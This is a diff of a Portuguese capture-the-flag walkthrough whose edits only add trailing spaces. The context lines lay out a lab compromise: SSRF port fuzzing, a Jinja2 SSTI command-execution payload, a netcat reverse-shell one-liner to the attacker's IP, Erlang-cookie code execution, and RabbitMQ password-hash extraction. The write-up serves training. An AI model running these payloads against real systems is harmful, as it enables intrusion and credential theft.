@@ -23,7 +23,7 @@ Uma excelente oportunidade para treinar SSRF, SSTI, RCE e Mass Assignment! além
 ### Recon
 Vamos começar pelo bom e velho recon. Um recon ruim, a probabilidade de um ataque falhar é alta. Gosto sempre de começar por um recon mais simples, para ter ruma noção de quais serviços vou encarar na máquina, e só então, em cima desses serviços faço um recon mais apurado. 
 
-Começando pelo recon mais simples, vamos caçar todas as portas abertas da máquina:
+Começando pelo recon mais simples, vamos caçar todas as portas abertas da máquina: 
 `sudo nmap -sS -v -p- --min-rate 5000 10.66.188.236 -oN nmap/first.txt`
 
 Vamos dar uma olhada nos resultados:
@@ -39,7 +39,7 @@ PORT      STATE SERVICE
 25672/tcp open  unknown
 ```
 Interessante!
-Agora vamos dar um aprofundada, nesses serviços:
+Agora vamos dar um aprofundada, nesses serviços: 
 `sudo nmap -sCV -v -p22,80,4369,25672 10.66.188.236 -oN nmap/versions.txt`
 Vamos dar uma olhada agora:
 ```
@@ -125,7 +125,7 @@ Você pode tentar webshell ai que não vai, Vai por mim, mas caso ainda não ten
 
 Agora eu te convido a pensar: Percebeu o campo ali? "Upload from URL" te lembra alguma possível vulnerabilidade? Veja que ele vai fazer request pra algum lugar.
 
-O bom e velho **SSRF** pode entrar ali! O que precisamos é apenas confirmar, e para isso, o Python já ajuda:
+O bom e velho **SSRF** pode entrar ali! O que precisamos é apenas confirmar, e para isso, o Python já ajuda: 
 `python3 -m http.server`
 
 E veja! A requisição bateu!
@@ -151,7 +151,7 @@ Usando a feature de upload via URL, faça uma request para `localhos:80/api/docs
 
 Usando o Burp ou mesmo o browser (via aba Networks do DevTools), pegue essa request e salve em um arquivo de texto.
 
-Precisamos de uma wordlist com número de todas a portas possíveis, para isso, conseguimos usar o própria `bash` para gerar:
+Precisamos de uma wordlist com número de todas a portas possíveis, para isso, conseguimos usar o própria `bash` para gerar: 
 `echo {1..65365} | tr " " "\n" > ports.txt`
 
 Agora, edite o arquivo da request da seguinte maneira:
@@ -172,7 +172,7 @@ Connection: keep-alive
 {"url":"http://localhost:FUZZ/api/docs"}
 ```
 
-E no `ffuf` podemos fazer o seguinte:
+E no `ffuf` podemos fazer o seguinte: 
 `ffuf -request req.txt -w ./ports.txt -request-proto http -fc 500`
 
 Já filtraremos requests com status code **500** para facilitar a visualização da output.
@@ -283,14 +283,14 @@ Se você der uma pesquisada em payloads SSTI ai pela internet, como o [PayloadAl
 
 Dando uma olhada no site que te indiquei, verás também que esse payload é correspondente a engine **Jinja2 (Python)**! Isso é excelente! Já nos denuncia qual é a engine por trás da geração desta página de erro.
 
-Excelente! Agora que sabemos que se trata da Jinja2, precisamos saber se há alguma forma de executar comados no servidor através desse SSTI, caçando um payload pela internet, você encontra esse aqui:
+Excelente! Agora que sabemos que se trata da Jinja2, precisamos saber se há alguma forma de executar comados no servidor através desse SSTI, caçando um payload pela internet, você encontra esse aqui: 
 `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 
 Testando esse payload na aplicação, veja que funcionou! Conseguimos um executar comados!
 
 ![RCE](../assets/img/rabbit_store/rce.png)
 
-Maravilha! Pois partiremos agora para uma shell! Vou usar o payload:
+Maravilha! Pois partiremos agora para uma shell! Vou usar o payload: 
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <seu_ip> 9001 >/tmp/f`
 
 Mas fica a teu critério qual utilizar! Basta colocar no lugar do `id` ali no payload do SSTI e testar! 
@@ -325,7 +325,7 @@ Com uma shell mais estável, agora basta ir em `/home/azrael` e pegar a **user f
 ### Root Flag
 Certo, antes de qualquer coisa, vamos executar o `pspy64` na máquina e ver se encontramos algo interessante, usaremos isso como ponto de partida.
 
-Baixo o `pspy64` [aqui](https://github.com/DominicBreuker/pspy) e envie para a máquia alvo, pode ser via:
+Baixo o `pspy64` [aqui](https://github.com/DominicBreuker/pspy) e envie para a máquia alvo, pode ser via: 
 `python3 -m http.server`
 
 Ao executar o `pspy64`, depois de uns segundos, vemos algo interessate!
@@ -358,7 +358,7 @@ Veja que o UID bate com o mostrado pelo `pspy64` confirmado o cenário!
 
 Pesquisando um pouco vemos que há uma possibilidade de execução código via EPMD neste cenário, [aqui](https://book.hacktricks.wiki/en/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html#erlang-cookie-rce) está a referência.
 
-Precisamos do `.erlang.cookie`, e conseguimos facilmente encontrar com o `find`:
+Precisamos do `.erlang.cookie`, e conseguimos facilmente encontrar com o `find`: 
 `find / -type f -name .erlang.cookie 2>/dev/null`
 
 Aqui está:
@@ -402,7 +402,7 @@ Ao pesquisarmos um pouco sobre  RabbitMQ, parece que ele expõe informações so
 
 Dando uma pesquisada, Vemos  que podemos tentar conversar cm o RabbitMQ usando o `rabbitmqctl`, uma tool CLI usando para conversar com ele via terminal.
 
-Vamos tentar listar o usuários presentes na configuração do RabbitMQ:
+Vamos tentar listar o usuários presentes na configuração do RabbitMQ: 
 `rabbitmqctl list_users`
 
 Recebemos um erro:
@@ -419,7 +419,7 @@ rabbitmq@forge:~$ rabbitmqctl list_users
 
 ```
 
-Para resolver isso, basta fazer um:
+Para resolver isso, basta fazer um: 
 `chmod 600 .erlang.cookie`
 
 Veja que agora conseguimos:
@@ -496,7 +496,7 @@ Seguindo os mesmos passos, chegamos na hash + o saltt:
 e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
 ```
 
-Se removermos os primeiros 4 bytes, teremos a hash pura, sem o salt adicionado pela segunda vez (embora ele tenha sido adicionado pela primeira vez, leia o algoritmo acima):
+Se removermos os primeiros 4 bytes, teremos a hash pura, sem o salt adicionado pela segunda vez (embora ele tenha sido adicionado pela primeira vez, leia o algoritmo acima): 
 
 `295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585`
 
